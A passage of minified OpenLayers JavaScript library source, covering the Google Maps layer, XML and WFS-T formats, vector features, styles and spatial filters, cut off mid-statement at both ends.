OpenLayers.Bounds(b.lon,a.lat,a.lon,b.lat):null},getZoomForResolution:function(a){if(null!=this.resolutions)return OpenLayers.Layer.prototype.getZoomForResolution.apply(this,arguments);var b=OpenLayers.Layer.prototype.getExtent.apply(this,\n[]);return this.getZoomForExtent(b)},getOLZoomFromMapObjectZoom:function(a){var b=null;null!=a&&(b=a-this.minZoomLevel,this.map.baseLayer!==this&&(b=this.map.baseLayer.getZoomForResolution(this.getResolutionForZoom(b))));return b},getMapObjectZoomFromOLZoom:function(a){var b=null;null!=a&&(b=a+this.minZoomLevel,this.map.baseLayer!==this&&(b=this.getZoomForResolution(this.map.baseLayer.getResolutionForZoom(b))));return b},CLASS_NAME:\"OpenLayers.Layer.FixedZoomLevels\"});OpenLayers.Layer.Google=OpenLayers.Class(OpenLayers.Layer.EventPane,OpenLayers.Layer.FixedZoomLevels,{MIN_ZOOM_LEVEL:0,MAX_ZOOM_LEVEL:21,RESOLUTIONS:[1.40625,0.703125,0.3515625,0.17578125,0.087890625,0.0439453125,0.02197265625,0.010986328125,0.0054931640625,0.00274658203125,0.001373291015625,6.866455078125E-4,3.4332275390625E-4,1.71661376953125E-4,8.58306884765625E-5,4.291534423828125E-5,2.145767211914062E-5,1.072883605957031E-5,5.36441802978515E-6,2.68220901489257E-6,1.341104507446289E-6,6.705522537231445E-7],\ntype:null,wrapDateLine:!0,sphericalMercator:!1,version:null,initialize:function(a,b){b=b||{};b.version||(b.version=\"function\"===typeof GMap2?\"2\":\"3\");var c=OpenLayers.Layer.Google[\"v\"+b.version.replace(/\\./g,\"_\")];if(c)OpenLayers.Util.applyDefaults(b,c);else throw\"Unsupported Google Maps API version: \"+b.version;OpenLayers.Util.applyDefaults(b,c.DEFAULTS);b.maxExtent&&(b.maxExtent=b.maxExtent.clone());OpenLayers.Layer.EventPane.prototype.initialize.apply(this,[a,b]);OpenLayers.Layer.FixedZoomLevels.prototype.initialize.apply(this,\n[a,b]);this.sphericalMercator&&(OpenLayers.Util.extend(this,OpenLayers.Layer.SphericalMercator),this.initMercatorParameters())},clone:function(){return new OpenLayers.Layer.Google(this.name,this.getOptions())},setVisibility:function(a){var b=null==this.opacity?1:this.opacity;OpenLayers.Layer.EventPane.prototype.setVisibility.apply(this,arguments);this.setOpacity(b)},display:function(a){this._dragging||this.setGMapVisibility(a);OpenLayers.Layer.EventPane.prototype.display.apply(this,arguments)},moveTo:function(a,\nb,c){this._dragging=c;OpenLayers.Layer.EventPane.prototype.moveTo.apply(this,arguments);delete this._dragging},setOpacity:function(a){a!==this.opacity&&(null!=this.map&&this.map.events.triggerEvent(\"changelayer\",{layer:this,property:\"opacity\"}),this.opacity=a);if(this.getVisibility()){var b=this.getMapContainer();OpenLayers.Util.modifyDOMElement(b,null,null,null,null,null,null,a)}},destroy:function(){if(this.map){this.setGMapVisibility(!1);var a=OpenLayers.Layer.Google.cache[this.map.id];a&&1>=a.count&&\nthis.removeGMapElements()}OpenLayers.Layer.EventPane.prototype.destroy.apply(this,arguments)},removeGMapElements:function(){var a=OpenLayers.Layer.Google.cache[this.map.id];if(a){var b=this.mapObject&&this.getMapContainer();b&&b.parentNode&&b.parentNode.removeChild(b);(b=a.termsOfUse)&&b.parentNode&&b.parentNode.removeChild(b);(a=a.poweredBy)&&a.parentNode&&a.parentNode.removeChild(a);this.mapObject&&(window.google&&google.maps&&google.maps.event&&google.maps.event.clearListeners)&&google.maps.event.clearListeners(this.mapObject,\n\"tilesloaded\")}},removeMap:function(a){this.visibility&&this.mapObject&&this.setGMapVisibility(!1);var b=OpenLayers.Layer.Google.cache[a.id];b&&(1>=b.count?(this.removeGMapElements(),delete OpenLayers.Layer.Google.cache[a.id]):--b.count);delete this.termsOfUse;delete this.poweredBy;delete this.mapObject;delete this.dragObject;OpenLayers.Layer.EventPane.prototype.removeMap.apply(this,arguments)},getOLBoundsFromMapObjectBounds:function(a){var b=null;null!=a&&(b=a.getSouthWest(),a=a.getNorthEast(),this.sphericalMercator?\n(b=this.forwardMercator(b.lng(),b.lat()),a=this.forwardMercator(a.lng(),a.lat())):(b=new OpenLayers.LonLat(b.lng(),b.lat()),a=new OpenLayers.LonLat(a.lng(),a.lat())),b=new OpenLayers.Bounds(b.lon,b.lat,a.lon,a.lat));return b},getWarningHTML:function(){return OpenLayers.i18n(\"googleWarning\")},getMapObjectCenter:function(){return this.mapObject.getCenter()},getMapObjectZoom:function(){return this.mapObject.getZoom()},getLongitudeFromMapObjectLonLat:function(a){return this.sphericalMercator?this.forwardMercator(a.lng(),\na.lat()).lon:a.lng()},getLatitudeFromMapObjectLonLat:function(a){return this.sphericalMercator?this.forwardMercator(a.lng(),a.lat()).lat:a.lat()},getXFromMapObjectPixel:function(a){return a.x},getYFromMapObjectPixel:function(a){return a.y},CLASS_NAME:\"OpenLayers.Layer.Google\"});OpenLayers.Layer.Google.cache={};\nOpenLayers.Layer.Google.v2={termsOfUse:null,poweredBy:null,dragObject:null,loadMapObject:function(){this.type||(this.type=G_NORMAL_MAP);var a,b,c,d=OpenLayers.Layer.Google.cache[this.map.id];if(d)a=d.mapObject,b=d.termsOfUse,c=d.poweredBy,++d.count;else{var d=this.map.viewPortDiv,e=document.createElement(\"div\");e.id=this.map.id+\"_GMap2Container\";e.style.position=\"absolute\";e.style.width=\"100%\";e.style.height=\"100%\";d.appendChild(e);try{a=new GMap2(e),b=e.lastChild,d.appendChild(b),b.style.zIndex=\n\"1100\",b.style.right=\"\",b.style.bottom=\"\",b.className=\"olLayerGoogleCopyright\",c=e.lastChild,d.appendChild(c),c.style.zIndex=\"1100\",c.style.right=\"\",c.style.bottom=\"\",c.className=\"olLayerGooglePoweredBy gmnoprint\"}catch(f){throw f;}OpenLayers.Layer.Google.cache[this.map.id]={mapObject:a,termsOfUse:b,poweredBy:c,count:1}}this.mapObject=a;this.termsOfUse=b;this.poweredBy=c;-1===OpenLayers.Util.indexOf(this.mapObject.getMapTypes(),this.type)&&this.mapObject.addMapType(this.type);\"function\"==typeof a.getDragObject?\nthis.dragObject=a.getDragObject():this.dragPanMapObject=null;!1===this.isBaseLayer&&this.setGMapVisibility(\"none\"!==this.div.style.display)},onMapResize:function(){if(this.visibility&&this.mapObject.isLoaded())this.mapObject.checkResize();else{if(!this._resized)var a=this,b=GEvent.addListener(this.mapObject,\"load\",function(){GEvent.removeListener(b);delete a._resized;a.mapObject.checkResize();a.moveTo(a.map.getCenter(),a.map.getZoom())});this._resized=!0}},setGMapVisibility:function(a){var b=OpenLayers.Layer.Google.cache[this.map.id];\nif(b){var c=this.mapObject.getContainer();!0===a?(this.mapObject.setMapType(this.type),c.style.display=\"\",this.termsOfUse.style.left=\"\",this.termsOfUse.style.display=\"\",this.poweredBy.style.display=\"\",b.displayed=this.id):(b.displayed===this.id&&delete b.displayed,b.displayed||(c.style.display=\"none\",this.termsOfUse.style.display=\"none\",this.termsOfUse.style.left=\"-9999px\",this.poweredBy.style.display=\"none\"))}},getMapContainer:function(){return this.mapObject.getContainer()},getMapObjectBoundsFromOLBounds:function(a){var b=\nnull;null!=a&&(b=this.sphericalMercator?this.inverseMercator(a.bottom,a.left):new OpenLayers.LonLat(a.bottom,a.left),a=this.sphericalMercator?this.inverseMercator(a.top,a.right):new OpenLayers.LonLat(a.top,a.right),b=new GLatLngBounds(new GLatLng(b.lat,b.lon),new GLatLng(a.lat,a.lon)));return b},setMapObjectCenter:function(a,b){this.mapObject.setCenter(a,b)},dragPanMapObject:function(a,b){this.dragObject.moveBy(new GSize(-a,b))},getMapObjectLonLatFromMapObjectPixel:function(a){return this.mapObject.fromContainerPixelToLatLng(a)},\ngetMapObjectPixelFromMapObjectLonLat:function(a){return this.mapObject.fromLatLngToContainerPixel(a)},getMapObjectZoomFromMapObjectBounds:function(a){return this.mapObject.getBoundsZoomLevel(a)},getMapObjectLonLatFromLonLat:function(a,b){var c;this.sphericalMercator?(c=this.inverseMercator(a,b),c=new GLatLng(c.lat,c.lon)):c=new GLatLng(b,a);return c},getMapObjectPixelFromXY:function(a,b){return new GPoint(a,b)}};OpenLayers.Format.XML=OpenLayers.Class(OpenLayers.Format,{namespaces:null,namespaceAlias:null,defaultPrefix:null,readers:{},writers:{},xmldom:null,initialize:function(a){window.ActiveXObject&&(this.xmldom=new ActiveXObject(\"Microsoft.XMLDOM\"));OpenLayers.Format.prototype.initialize.apply(this,[a]);this.namespaces=OpenLayers.Util.extend({},this.namespaces);this.namespaceAlias={};for(var b in this.namespaces)this.namespaceAlias[this.namespaces[b]]=b},destroy:function(){this.xmldom=null;OpenLayers.Format.prototype.destroy.apply(this,\narguments)},setNamespace:function(a,b){this.namespaces[a]=b;this.namespaceAlias[b]=a},read:function(a){var b=a.indexOf(\"<\");0<b&&(a=a.substring(b));b=OpenLayers.Util.Try(OpenLayers.Function.bind(function(){var b;b=window.ActiveXObject&&!this.xmldom?new ActiveXObject(\"Microsoft.XMLDOM\"):this.xmldom;b.loadXML(a);return b},this),function(){return(new DOMParser).parseFromString(a,\"text/xml\")},function(){var b=new XMLHttpRequest;b.open(\"GET\",\"data:text/xml;charset=utf-8,\"+encodeURIComponent(a),!1);b.overrideMimeType&&\nb.overrideMimeType(\"text/xml\");b.send(null);return b.responseXML});this.keepData&&(this.data=b);return b},write:function(a){if(this.xmldom)a=a.xml;else{var b=new XMLSerializer;if(1==a.nodeType){var c=document.implementation.createDocument(\"\",\"\",null);c.importNode&&(a=c.importNode(a,!0));c.appendChild(a);a=b.serializeToString(c)}else a=b.serializeToString(a)}return a},createElementNS:function(a,b){return this.xmldom?\"string\"==typeof a?this.xmldom.createNode(1,b,a):this.xmldom.createNode(1,b,\"\"):document.createElementNS(a,\nb)},createDocumentFragment:function(){return this.xmldom?this.xmldom.createDocumentFragment():document.createDocumentFragment()},createTextNode:function(a){\"string\"!==typeof a&&(a=String(a));return this.xmldom?this.xmldom.createTextNode(a):document.createTextNode(a)},getElementsByTagNameNS:function(a,b,c){var d=[];if(a.getElementsByTagNameNS)d=a.getElementsByTagNameNS(b,c);else{a=a.getElementsByTagName(\"*\");for(var e,f,g=0,h=a.length;g<h;++g)if(e=a[g],f=e.prefix?e.prefix+\":\"+c:c,\"*\"==c||f==e.nodeName)\"*\"!=\nb&&b!=e.namespaceURI||d.push(e)}return d},getAttributeNodeNS:function(a,b,c){var d=null;if(a.getAttributeNodeNS)d=a.getAttributeNodeNS(b,c);else{a=a.attributes;for(var e,f,g=0,h=a.length;g<h;++g)if(e=a[g],e.namespaceURI==b&&(f=e.prefix?e.prefix+\":\"+c:c,f==e.nodeName)){d=e;break}}return d},getAttributeNS:function(a,b,c){var d=\"\";if(a.getAttributeNS)d=a.getAttributeNS(b,c)||\"\";else if(a=this.getAttributeNodeNS(a,b,c))d=a.nodeValue;return d},getChildValue:function(a,b){var c=b||\"\";if(a)for(var d=a.firstChild;d;d=\nd.nextSibling)switch(d.nodeType){case 3:case 4:c+=d.nodeValue}return c},isSimpleContent:function(a){var b=!0;for(a=a.firstChild;a;a=a.nextSibling)if(1===a.nodeType){b=!1;break}return b},contentType:function(a){var b=!1,c=!1,d=OpenLayers.Format.XML.CONTENT_TYPE.EMPTY;for(a=a.firstChild;a;a=a.nextSibling){switch(a.nodeType){case 1:c=!0;break;case 8:break;default:b=!0}if(c&&b)break}if(c&&b)d=OpenLayers.Format.XML.CONTENT_TYPE.MIXED;else{if(c)return OpenLayers.Format.XML.CONTENT_TYPE.COMPLEX;if(b)return OpenLayers.Format.XML.CONTENT_TYPE.SIMPLE}return d},\nhasAttributeNS:function(a,b,c){var d=!1;return d=a.hasAttributeNS?a.hasAttributeNS(b,c):!!this.getAttributeNodeNS(a,b,c)},setAttributeNS:function(a,b,c,d){if(a.setAttributeNS)a.setAttributeNS(b,c,d);else if(this.xmldom)b?(b=a.ownerDocument.createNode(2,c,b),b.nodeValue=d,a.setAttributeNode(b)):a.setAttribute(c,d);else throw\"setAttributeNS not implemented\";},createElementNSPlus:function(a,b){b=b||{};var c=b.uri||this.namespaces[b.prefix];c||(c=a.indexOf(\":\"),c=this.namespaces[a.substring(0,c)]);c||\n(c=this.namespaces[this.defaultPrefix]);c=this.createElementNS(c,a);b.attributes&&this.setAttributes(c,b.attributes);var d=b.value;null!=d&&c.appendChild(this.createTextNode(d));return c},setAttributes:function(a,b){var c,d,e;for(e in b)null!=b[e]&&b[e].toString&&(c=b[e].toString(),d=this.namespaces[e.substring(0,e.indexOf(\":\"))]||null,this.setAttributeNS(a,d,e,c))},readNode:function(a,b){b||(b={});var c=this.readers[a.namespaceURI?this.namespaceAlias[a.namespaceURI]:this.defaultPrefix];if(c){var d=\na.localName||a.nodeName.split(\":\").pop();(c=c[d]||c[\"*\"])&&c.apply(this,[a,b])}return b},readChildNodes:function(a,b){b||(b={});for(var c=a.childNodes,d,e=0,f=c.length;e<f;++e)d=c[e],1==d.nodeType&&this.readNode(d,b);return b},writeNode:function(a,b,c){var d,e=a.indexOf(\":\");0<e?(d=a.substring(0,e),a=a.substring(e+1)):d=c?this.namespaceAlias[c.namespaceURI]:this.defaultPrefix;b=this.writers[d][a].apply(this,[b]);c&&c.appendChild(b);return b},getChildEl:function(a,b,c){return a&&this.getThisOrNextEl(a.firstChild,\nb,c)},getNextEl:function(a,b,c){return a&&this.getThisOrNextEl(a.nextSibling,b,c)},getThisOrNextEl:function(a,b,c){a:for(;a;a=a.nextSibling)switch(a.nodeType){case 1:if(!(b&&b!==(a.localName||a.nodeName.split(\":\").pop())||c&&c!==a.namespaceURI))break a;a=null;break a;case 3:if(/^\\s*$/.test(a.nodeValue))break;case 4:case 6:case 12:case 10:case 11:a=null;break a}return a||null},lookupNamespaceURI:function(a,b){var c=null;if(a)if(a.lookupNamespaceURI)c=a.lookupNamespaceURI(b);else a:switch(a.nodeType){case 1:if(null!==\na.namespaceURI&&a.prefix===b){c=a.namespaceURI;break a}if(c=a.attributes.length)for(var d,e=0;e<c;++e)if(d=a.attributes[e],\"xmlns\"===d.prefix&&d.name===\"xmlns:\"+b){c=d.value||null;break a}else if(\"xmlns\"===d.name&&null===b){c=d.value||null;break a}c=this.lookupNamespaceURI(a.parentNode,b);break a;case 2:c=this.lookupNamespaceURI(a.ownerElement,b);break a;case 9:c=this.lookupNamespaceURI(a.documentElement,b);break a;case 6:case 12:case 10:case 11:break a;default:c=this.lookupNamespaceURI(a.parentNode,\nb)}return c},getXMLDoc:function(){OpenLayers.Format.XML.document||this.xmldom||(document.implementation&&document.implementation.createDocument?OpenLayers.Format.XML.document=document.implementation.createDocument(\"\",\"\",null):!this.xmldom&&window.ActiveXObject&&(this.xmldom=new ActiveXObject(\"Microsoft.XMLDOM\")));return OpenLayers.Format.XML.document||this.xmldom},CLASS_NAME:\"OpenLayers.Format.XML\"});OpenLayers.Format.XML.CONTENT_TYPE={EMPTY:0,SIMPLE:1,COMPLEX:2,MIXED:3};\nOpenLayers.Format.XML.lookupNamespaceURI=OpenLayers.Function.bind(OpenLayers.Format.XML.prototype.lookupNamespaceURI,OpenLayers.Format.XML.prototype);OpenLayers.Format.XML.document=null;OpenLayers.Format.WFST=function(a){a=OpenLayers.Util.applyDefaults(a,OpenLayers.Format.WFST.DEFAULTS);var b=OpenLayers.Format.WFST[\"v\"+a.version.replace(/\\./g,\"_\")];if(!b)throw\"Unsupported WFST version: \"+a.version;return new b(a)};OpenLayers.Format.WFST.DEFAULTS={version:\"1.0.0\"};OpenLayers.Feature=OpenLayers.Class({layer:null,id:null,lonlat:null,data:null,marker:null,popupClass:null,popup:null,initialize:function(a,b,c){this.layer=a;this.lonlat=b;this.data=null!=c?c:{};this.id=OpenLayers.Util.createUniqueID(this.CLASS_NAME+\"_\")},destroy:function(){null!=this.layer&&null!=this.layer.map&&null!=this.popup&&this.layer.map.removePopup(this.popup);null!=this.layer&&null!=this.marker&&this.layer.removeMarker(this.marker);this.data=this.lonlat=this.id=this.layer=null;null!=this.marker&&\n(this.destroyMarker(this.marker),this.marker=null);null!=this.popup&&(this.destroyPopup(this.popup),this.popup=null)},onScreen:function(){var a=!1;null!=this.layer&&null!=this.layer.map&&(a=this.layer.map.getExtent().containsLonLat(this.lonlat));return a},createMarker:function(){null!=this.lonlat&&(this.marker=new OpenLayers.Marker(this.lonlat,this.data.icon));return this.marker},destroyMarker:function(){this.marker.destroy()},createPopup:function(a){null!=this.lonlat&&(this.popup||(this.popup=new (this.popupClass?\nthis.popupClass:OpenLayers.Popup.Anchored)(this.id+\"_popup\",this.lonlat,this.data.popupSize,this.data.popupContentHTML,this.marker?this.marker.icon:null,a)),null!=this.data.overflow&&(this.popup.contentDiv.style.overflow=this.data.overflow),this.popup.feature=this);return this.popup},destroyPopup:function(){this.popup&&(this.popup.feature=null,this.popup.destroy(),this.popup=null)},CLASS_NAME:\"OpenLayers.Feature\"});OpenLayers.State={UNKNOWN:\"Unknown\",INSERT:\"Insert\",UPDATE:\"Update\",DELETE:\"Delete\"};\nOpenLayers.Feature.Vector=OpenLayers.Class(OpenLayers.Feature,{fid:null,geometry:null,attributes:null,bounds:null,state:null,style:null,url:null,renderIntent:\"default\",modified:null,initialize:function(a,b,c){OpenLayers.Feature.prototype.initialize.apply(this,[null,null,b]);this.lonlat=null;this.geometry=a?a:null;this.state=null;this.attributes={};b&&(this.attributes=OpenLayers.Util.extend(this.attributes,b));this.style=c?c:null},destroy:function(){this.layer&&(this.layer.removeFeatures(this),this.layer=\nnull);this.modified=this.geometry=null;OpenLayers.Feature.prototype.destroy.apply(this,arguments)},clone:function(){return new OpenLayers.Feature.Vector(this.geometry?this.geometry.clone():null,this.attributes,this.style)},onScreen:function(a){var b=!1;this.layer&&this.layer.map&&(b=this.layer.map.getExtent(),a?(a=this.geometry.getBounds(),b=b.intersectsBounds(a)):b=b.toGeometry().intersects(this.geometry));return b},getVisibility:function(){return!(this.style&&\"none\"==this.style.display||!this.layer||\nthis.layer&&this.layer.styleMap&&\"none\"==this.layer.styleMap.createSymbolizer(this,this.renderIntent).display||this.layer&&!this.layer.getVisibility())},createMarker:function(){return null},destroyMarker:function(){},createPopup:function(){return null},atPoint:function(a,b,c){var d=!1;this.geometry&&(d=this.geometry.atPoint(a,b,c));return d},destroyPopup:function(){},move:function(a){if(this.layer&&this.geometry.move){a=\"OpenLayers.LonLat\"==a.CLASS_NAME?this.layer.getViewPortPxFromLonLat(a):a;var b=\nthis.layer.getViewPortPxFromLonLat(this.geometry.getBounds().getCenterLonLat()),c=this.layer.map.getResolution();this.geometry.move(c*(a.x-b.x),c*(b.y-a.y));this.layer.drawFeature(this);return b}},toState:function(a){if(a==OpenLayers.State.UPDATE)switch(this.state){case OpenLayers.State.UNKNOWN:case OpenLayers.State.DELETE:this.state=a}else if(a==OpenLayers.State.INSERT)switch(this.state){case OpenLayers.State.UNKNOWN:break;default:this.state=a}else if(a==OpenLayers.State.DELETE)switch(this.state){case OpenLayers.State.UNKNOWN:case OpenLayers.State.UPDATE:this.state=\na}else a==OpenLayers.State.UNKNOWN&&(this.state=a)},CLASS_NAME:\"OpenLayers.Feature.Vector\"});\nOpenLayers.Feature.Vector.style={\"default\":{fillColor:\"#ee9900\",fillOpacity:0.4,hoverFillColor:\"white\",hoverFillOpacity:0.8,strokeColor:\"#ee9900\",strokeOpacity:1,strokeWidth:1,strokeLinecap:\"round\",strokeDashstyle:\"solid\",hoverStrokeColor:\"red\",hoverStrokeOpacity:1,hoverStrokeWidth:0.2,pointRadius:6,hoverPointRadius:1,hoverPointUnit:\"%\",pointerEvents:\"visiblePainted\",cursor:\"inherit\",fontColor:\"#000000\",labelAlign:\"cm\",labelOutlineColor:\"white\",labelOutlineWidth:3},select:{fillColor:\"blue\",fillOpacity:0.4,\nhoverFillColor:\"white\",hoverFillOpacity:0.8,strokeColor:\"blue\",strokeOpacity:1,strokeWidth:2,strokeLinecap:\"round\",strokeDashstyle:\"solid\",hoverStrokeColor:\"red\",hoverStrokeOpacity:1,hoverStrokeWidth:0.2,pointRadius:6,hoverPointRadius:1,hoverPointUnit:\"%\",pointerEvents:\"visiblePainted\",cursor:\"pointer\",fontColor:\"#000000\",labelAlign:\"cm\",labelOutlineColor:\"white\",labelOutlineWidth:3},temporary:{fillColor:\"#66cccc\",fillOpacity:0.2,hoverFillColor:\"white\",hoverFillOpacity:0.8,strokeColor:\"#66cccc\",strokeOpacity:1,\nstrokeLinecap:\"round\",strokeWidth:2,strokeDashstyle:\"solid\",hoverStrokeColor:\"red\",hoverStrokeOpacity:1,hoverStrokeWidth:0.2,pointRadius:6,hoverPointRadius:1,hoverPointUnit:\"%\",pointerEvents:\"visiblePainted\",cursor:\"inherit\",fontColor:\"#000000\",labelAlign:\"cm\",labelOutlineColor:\"white\",labelOutlineWidth:3},\"delete\":{display:\"none\"}};OpenLayers.Style=OpenLayers.Class({id:null,name:null,title:null,description:null,layerName:null,isDefault:!1,rules:null,context:null,defaultStyle:null,defaultsPerSymbolizer:!1,propertyStyles:null,initialize:function(a,b){OpenLayers.Util.extend(this,b);this.rules=[];b&&b.rules&&this.addRules(b.rules);this.setDefaultStyle(a||OpenLayers.Feature.Vector.style[\"default\"]);this.id=OpenLayers.Util.createUniqueID(this.CLASS_NAME+\"_\")},destroy:function(){for(var a=0,b=this.rules.length;a<b;a++)this.rules[a].destroy(),\nthis.rules[a]=null;this.defaultStyle=this.rules=null},createSymbolizer:function(a){for(var b=this.defaultsPerSymbolizer?{}:this.createLiterals(OpenLayers.Util.extend({},this.defaultStyle),a),c=this.rules,d,e=[],f=!1,g=0,h=c.length;g<h;g++)d=c[g],d.evaluate(a)&&(d instanceof OpenLayers.Rule&&d.elseFilter?e.push(d):(f=!0,this.applySymbolizer(d,b,a)));if(!1==f&&0<e.length)for(f=!0,g=0,h=e.length;g<h;g++)this.applySymbolizer(e[g],b,a);0<c.length&&!1==f&&(b.display=\"none\");null!=b.label&&\"string\"!==typeof b.label&&\n(b.label=String(b.label));return b},applySymbolizer:function(a,b,c){var d=c.geometry?this.getSymbolizerPrefix(c.geometry):OpenLayers.Style.SYMBOLIZER_PREFIXES[0];a=a.symbolizer[d]||a.symbolizer;!0===this.defaultsPerSymbolizer&&(d=this.defaultStyle,OpenLayers.Util.applyDefaults(a,{pointRadius:d.pointRadius}),!0!==a.stroke&&!0!==a.graphic||OpenLayers.Util.applyDefaults(a,{strokeWidth:d.strokeWidth,strokeColor:d.strokeColor,strokeOpacity:d.strokeOpacity,strokeDashstyle:d.strokeDashstyle,strokeLinecap:d.strokeLinecap}),\n!0!==a.fill&&!0!==a.graphic||OpenLayers.Util.applyDefaults(a,{fillColor:d.fillColor,fillOpacity:d.fillOpacity}),!0===a.graphic&&OpenLayers.Util.applyDefaults(a,{pointRadius:this.defaultStyle.pointRadius,externalGraphic:this.defaultStyle.externalGraphic,graphicName:this.defaultStyle.graphicName,graphicOpacity:this.defaultStyle.graphicOpacity,graphicWidth:this.defaultStyle.graphicWidth,graphicHeight:this.defaultStyle.graphicHeight,graphicXOffset:this.defaultStyle.graphicXOffset,graphicYOffset:this.defaultStyle.graphicYOffset}));\nreturn this.createLiterals(OpenLayers.Util.extend(b,a),c)},createLiterals:function(a,b){var c=OpenLayers.Util.extend({},b.attributes||b.data);OpenLayers.Util.extend(c,this.context);for(var d in this.propertyStyles)a[d]=OpenLayers.Style.createLiteral(a[d],c,b,d);return a},findPropertyStyles:function(){var a={};this.addPropertyStyles(a,this.defaultStyle);for(var b=this.rules,c,d,e=0,f=b.length;e<f;e++){c=b[e].symbolizer;for(var g in c)if(d=c[g],\"object\"==typeof d)this.addPropertyStyles(a,d);else{this.addPropertyStyles(a,\nc);break}}return a},addPropertyStyles:function(a,b){var c,d;for(d in b)c=b[d],\"string\"==typeof c&&c.match(/\\$\\{\\w+\\}/)&&(a[d]=!0);return a},addRules:function(a){Array.prototype.push.apply(this.rules,a);this.propertyStyles=this.findPropertyStyles()},setDefaultStyle:function(a){this.defaultStyle=a;this.propertyStyles=this.findPropertyStyles()},getSymbolizerPrefix:function(a){for(var b=OpenLayers.Style.SYMBOLIZER_PREFIXES,c=0,d=b.length;c<d;c++)if(-1!=a.CLASS_NAME.indexOf(b[c]))return b[c]},clone:function(){var a=\nOpenLayers.Util.extend({},this);if(this.rules){a.rules=[];for(var b=0,c=this.rules.length;b<c;++b)a.rules.push(this.rules[b].clone())}a.context=this.context&&OpenLayers.Util.extend({},this.context);b=OpenLayers.Util.extend({},this.defaultStyle);return new OpenLayers.Style(b,a)},CLASS_NAME:\"OpenLayers.Style\"});OpenLayers.Style.createLiteral=function(a,b,c,d){\"string\"==typeof a&&-1!=a.indexOf(\"${\")&&(a=OpenLayers.String.format(a,b,[c,d]),a=isNaN(a)||!a?a:parseFloat(a));return a};\nOpenLayers.Style.SYMBOLIZER_PREFIXES=[\"Point\",\"Line\",\"Polygon\",\"Text\",\"Raster\"];OpenLayers.Filter=OpenLayers.Class({initialize:function(a){OpenLayers.Util.extend(this,a)},destroy:function(){},evaluate:function(a){return!0},clone:function(){return null},toString:function(){return OpenLayers.Format&&OpenLayers.Format.CQL?OpenLayers.Format.CQL.prototype.write(this):Object.prototype.toString.call(this)},CLASS_NAME:\"OpenLayers.Filter\"});OpenLayers.Filter.Spatial=OpenLayers.Class(OpenLayers.Filter,{type:null,property:null,value:null,distance:null,distanceUnits:null,evaluate:function(a){var b=!1;switch(this.type){case OpenLayers.Filter.Spatial.BBOX:case OpenLayers.Filter.Spatial.INTERSECTS:if(a.geometry){var c=this.value;\"OpenLayers.Bounds\"==this.value.CLASS_NAME&&(c=this.value.toGeometry());a.geometry.intersects(c)&&(b=!0)}break;default:throw Error(\"evaluate is not implemented for this filter type.\");}return b},clone:function(){var a=\nOpenLayers.Util.applyDefaults({value:this.value&&this.value.clone&&this.value.clone()},this);return new OpenLayers.Filter.Spatial(a)},CLASS_NAME:\"OpenLayers.Filter.Spatial\"});OpenLayers.Filter.Spatial.BBOX=\"BBOX\";OpenLayers.Filter.Spatial.INTERSECTS=\"INTERSECTS\";OpenLayers.Filter.Spatial.DWITHIN=\"DWITHIN\";OpenLayers.Filter.Spatial.WITHIN=\"WITHIN\";OpenLayers.Filter.Spatial.CONTAINS=\"CONTAINS\";OpenLayers.Filter.FeatureId=OpenLayers.Class(OpenLayers.Filter,{fids:null,type:\"FID\",initialize:function(a){this.fids=[];OpenLayers.Filter.prototype.initialize.apply(this,[a])},evaluate:function(a){for(var b=0,c=this.fids.length;b<c;b++)if((a.fid||a.id)==this.fids[b])return!0;return!1},clone:function(){var a=new OpenLayers.Filter.FeatureId;OpenLayers.Util.extend(a,this);a.fids=this.fids.slice();return a},CLASS_NAME:\"OpenLayers.Filter.FeatureId\"});OpenLayers.Format.WFST.v1=OpenLayers.Class(OpenLayers.Format.XML,{namespaces:{xlink:\"http://www.w3.org/1999/xlink\",xsi:\"http://www.w3.org/2001/XMLSchema-instance\",wfs:\"http://www.opengis.net/wfs\",gml:\"http://www.opengis.net/gml\",ogc:\"http://www.opengis.net/ogc\",ows:\"http://www.opengis.net/ows\"},defaultPrefix:\"wfs\",version:null,schemaLocations:null,srsName:null,extractAttributes:!0,xy:!0,stateName:null,initialize:function(a){this.stateName={};this.stateName[OpenLayers.State.INSERT]=\"wfs:Insert\";this.stateName[OpenLayers.State.UPDATE]=\n\"wfs:Update\";this.stateName[OpenLayers.State.DELETE]=\"wfs:Delete\";OpenLayers.Format.XML.prototype.initialize.apply(this,[a])},getSrsName:function(a,b){var c=b&&b.srsName;c||(c=a&&a.layer?a.layer.projection.getCode():this.srsName);return c},read:function(a,b){b=b||{};OpenLayers.Util.applyDefaults(b,{output:\"features\"});\"string\"==typeof a&&(a=OpenLayers.Format.XML.prototype.read.apply(this,[a]));a&&9==a.nodeType&&(a=a.documentElement);var c={};a&&this.readNode(a,c,!0);c.features&&\"features\"===b.output&&\n(c=c.features);return c},readers:{wfs:{FeatureCollection:function(a,b){b.features=[];this.readChildNodes(a,b)}}},write:function(a,b){var c=this.writeNode(\"wfs:Transaction\",{features:a,options:b}),d=this.schemaLocationAttr();d&&this.setAttributeNS(c,this.namespaces.xsi,\"xsi:schemaLocation\",d);return OpenLayers.Format.XML.prototype.write.apply(this,[c])},writers:{wfs:{GetFeature:function(a){var b=this.createElementNSPlus(\"wfs:GetFeature\",{attributes:{service:\"WFS\",version:this.version,handle:a&&a.handle,\noutputFormat:a&&a.outputFormat,maxFeatures:a&&a.maxFeatures,\"xsi:schemaLocation\":this.schemaLocationAttr(a)}});if(\"string\"==typeof this.featureType)this.writeNode(\"Query\",a,b);else for(var c=0,d=this.featureType.length;c<d;c++)a.featureType=this.featureType[c],this.writeNode(\"Query\",a,b);return b},Transaction:function(a){a=a||{};var b=a.options||{},c=this.createElementNSPlus(\"wfs:Transaction\",{attributes:{service:\"WFS\",version:this.version,handle:b.handle}}),d,e=a.features;if(e){!0===b.multi&&OpenLayers.Util.extend(this.geometryTypes,\n{\"OpenLayers.Geometry.Point\":\"MultiPoint\",\"OpenLayers.Geometry.LineString\":!0===this.multiCurve?\"MultiCurve\":\"MultiLineString\",\"OpenLayers.Geometry.Polygon\":!0===this.multiSurface?\"MultiSurface\":\"MultiPolygon\"});var f,g;a=0;for(d=e.length;a<d;++a)g=e[a],(f=this.stateName[g.state])&&this.writeNode(f,{feature:g,options:b},c);!0===b.multi&&this.setGeometryTypes()}if(b.nativeElements)for(a=0,d=b.nativeElements.length;a<d;++a)this.writeNode(\"wfs:Native\",b.nativeElements[a],c);return c},Native:function(a){return this.createElementNSPlus(\"wfs:Native\",\n{attributes:{vendorId:a.vendorId,safeToIgnore:a.safeToIgnore},value:a.value})},Insert:function(a){var 